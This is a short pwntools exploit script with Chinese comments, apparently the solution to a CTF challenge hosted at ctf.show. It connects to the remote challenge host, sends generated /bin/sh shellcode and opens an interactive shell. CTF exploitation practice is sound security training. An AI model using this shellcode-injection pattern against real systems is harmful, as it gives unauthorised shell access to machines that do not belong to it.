from pwn import *                                # 导入  pwntools 库
context.log_level = 'debug'                      # 设置日志级别为调试模式
#io = process('./pwn')                           # 本地连接
io = remote("pwn.challenge.ctf.show", 28112)     # 远程连接
shellcode = asm(shellcraft.sh())                 # 生成一个  Shellcode
io.sendline(shellcode)                           # 将生成的  Shellcode 发送到目标
主机
io.interactive()                                 # 与目标主机进行交互
